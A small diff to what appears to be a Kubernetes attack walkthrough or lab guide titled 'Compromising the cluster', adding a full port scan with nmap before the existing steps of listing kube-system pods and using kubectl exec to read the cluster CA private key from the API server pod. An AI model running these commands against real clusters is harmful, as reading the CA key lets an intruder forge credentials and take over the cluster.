@@ -2,6 +2,7 @@
 
 ### Compromising the cluster
 
-1. `kubectl get po -n kube-system` will get the pod list for kube-system
-2. `kubectl -n kube-system exec [API_SERVER_POD] -- cat /etc/kubernetes/pki/ca.key`
-3. profit!
+1. Scan all ports on node `nmap [CLUSTERIP] -p-`
+2. Get list of pods in kube-system namespace `kubectl get po -n kube-system` 
+3. Grab the certificate`kubectl -n kube-system exec [API_SERVER_POD] -- cat /etc/kubernetes/pki/ca.key`
+4. Profit!
